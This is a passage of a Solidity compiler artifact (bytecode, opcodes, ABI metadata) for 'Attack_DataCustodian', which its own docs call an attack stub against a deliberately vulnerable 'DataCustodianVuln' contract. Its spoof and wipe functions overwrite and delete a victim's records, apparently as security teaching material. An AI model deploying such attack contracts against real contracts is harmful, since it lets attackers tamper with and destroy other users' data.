\"#utility.yul\":5149:5197   */\n      mstore\n        /* \"#utility.yul\":5214:5300   */\n      tag_109\n        /* \"#utility.yul\":5295:5299   */\n      dup2\n        /* \"#utility.yul\":5286:5292   */\n      dup5\n        /* \"#utility.yul\":5278:5284   */\n      dup7\n        /* \"#utility.yul\":5214:5300   */\n      tag_50\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":5206:5300   */\n      swap1\n      pop\n        /* \"#utility.yul\":4868:5307   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122097e414354b7ee2224c358bb19db49b565ebb7927144b2a84f9ca7bce54f3949e64736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5060405161058e38038061058e833981810160405281019061003191906100e5565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f80fd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6104718061011d5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c8063b38a162014610043578063d4b839921461005f578063e0d1e0721461007d575b5f80fd5b61005d6004803603810190610058919061020d565b610099565b005b610067610121565b60405161007491906102b2565b60405180910390f35b6100976004803603810190610092919061032c565b610144565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634cc82215826040518263ffffffff1660e01b81526004016100f19190610398565b5f604051808303815f87803b158015610108575f80fd5b505af115801561011a573d5f803e3d5ffd5b5050505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fededdb58484846040518463ffffffff1660e01b81526004016101a09392919061040b565b5f604051808303815f87803b1580156101b7575f80fd5b505af11580156101c9573d5f803e3d5ffd5b50505050505050565b5f80fd5b5f80fd5b5f819050919050565b6101ec816101da565b81146101f6575f80fd5b50565b5f81359050610207816101e3565b92915050565b5f60208284031215610222576102216101d2565b5b5f61022f848285016101f9565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61027a61027561027084610238565b610257565b610238565b9050919050565b5f61028b82610260565b9050919050565b5f61029c82610281565b9050919050565b6102ac81610292565b82525050565b5f6020820190506102c55f8301846102a3565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f8401126102ec576102eb6102cb565b5b8235905067ffffffffffffffff811115610309576103086102cf565b5b602083019150836001820283011115610325576103246102d3565b5b9250929050565b5f805f60408486031215610343576103426101d2565b5b5f610350868287016101f9565b935050602084013567ffffffffffffffff811115610371576103706101d6565b5b61037d868287016102d7565b92509250509250925092565b610392816101da565b82525050565b5f6020820190506103ab5f830184610389565b92915050565b5f82825260208201905092915050565b828183375f83830152505050565b5f601f19601f8301169050919050565b5f6103ea83856103b1565b93506103f78385846103c1565b610400836103cf565b840190509392505050565b5f60408201905061041e5f830186610389565b81810360208301526104318184866103df565b905094935050505056fea264697066735822122097e414354b7ee2224c358bb19db49b565ebb7927144b2a84f9ca7bce54f3949e64736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x58E CODESIZE SUB DUP1 PUSH2 0x58E DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x471 DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xB38A1620 EQ PUSH2 0x43 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x5F JUMPI DUP1 PUSH4 0xE0D1E072 EQ PUSH2 0x7D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x5D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x20D JUMP JUMPDEST PUSH2 0x99 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x67 PUSH2 0x121 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x74 SWAP2 SWAP1 PUSH2 0x2B2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x97 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x92 SWAP2 SWAP1 PUSH2 0x32C JUMP JUMPDEST PUSH2 0x144 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4CC82215 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF1 SWAP2 SWAP1 PUSH2 0x398 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x108 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x11A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFEDEDDB5 DUP5 DUP5 DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A0 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x40B JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B7 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C9 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1EC DUP2 PUSH2 0x1DA JUMP JUMPDEST DUP2 EQ PUSH2 0x1F6 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x207 DUP2 PUSH2 0x1E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x222 JUMPI PUSH2 0x221 PUSH2 0x1D2 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x22F DUP5 DUP3 DUP6 ADD PUSH2 0x1F9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x27A PUSH2 0x275 PUSH2 0x270 DUP5 PUSH2 0x238 JUMP JUMPDEST PUSH2 0x257 JUMP JUMPDEST PUSH2 0x238 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x28B DUP3 PUSH2 0x260 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x29C DUP3 PUSH2 0x281 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AC DUP2 PUSH2 0x292 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C5 PUSH0 DUP4 ADD DUP5 PUSH2 0x2A3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x2EC JUMPI PUSH2 0x2EB PUSH2 0x2CB JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x309 JUMPI PUSH2 0x308 PUSH2 0x2CF JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x325 JUMPI PUSH2 0x324 PUSH2 0x2D3 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 PUSH1 0x40 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x343 JUMPI PUSH2 0x342 PUSH2 0x1D2 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x350 DUP7 DUP3 DUP8 ADD PUSH2 0x1F9 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 DUP5 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x371 JUMPI PUSH2 0x370 PUSH2 0x1D6 JUMP JUMPDEST JUMPDEST PUSH2 0x37D DUP7 DUP3 DUP8 ADD PUSH2 0x2D7 JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH2 0x392 DUP2 PUSH2 0x1DA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3AB PUSH0 DUP4 ADD DUP5 PUSH2 0x389 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x3EA DUP4 DUP6 PUSH2 0x3B1 JUMP JUMPDEST SWAP4 POP PUSH2 0x3F7 DUP4 DUP6 DUP5 PUSH2 0x3C1 JUMP JUMPDEST PUSH2 0x400 DUP4 PUSH2 0x3CF JUMP JUMPDEST DUP5 ADD SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x41E PUSH0 DUP4 ADD DUP7 PUSH2 0x389 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x20 DUP4 ADD MSTORE PUSH2 0x431 DUP2 DUP5 DUP7 PUSH2 0x3DF JUMP JUMPDEST SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP8 0xE4 EQ CALLDATALOAD 0x4B PUSH31 0xE2224C358BB19DB49B565EBB7927144B2A84F9CA7BCE54F3949E64736F6C63 NUMBER STOP ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "227400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"spoof(uint256,bytes)": "infinite",
						"target()": "infinite",
						"wipe(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"spoof(uint256,bytes)": "e0d1e072",
					"target()": "d4b83992",
					"wipe(uint256)": "b38a1620"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 95,
						"contract": "D/Data Custodian/Data Custodian.sol:Attack_DataCustodian",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(DataCustodianVuln)91"
					}
				],
				"types": {
					"t_contract(DataCustodianVuln)91": {
						"encoding": "inplace",
						"label": "contract DataCustodianVuln",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {
					"spoof(uint256,bytes)": {
						"notice": "overwrite victim’s data"
					},
					"wipe(uint256)": {
						"notice": "wipe out a record"
					}
				},
				"notice": "───────────────────────────────────────────────────────────────────────────── 2) ATTACK STUB    • demonstrates unauthorized overwrite and deletion ─────────────────────────────────────────────────────────────────────────────",
				"version": 1
			}
		}
	}
}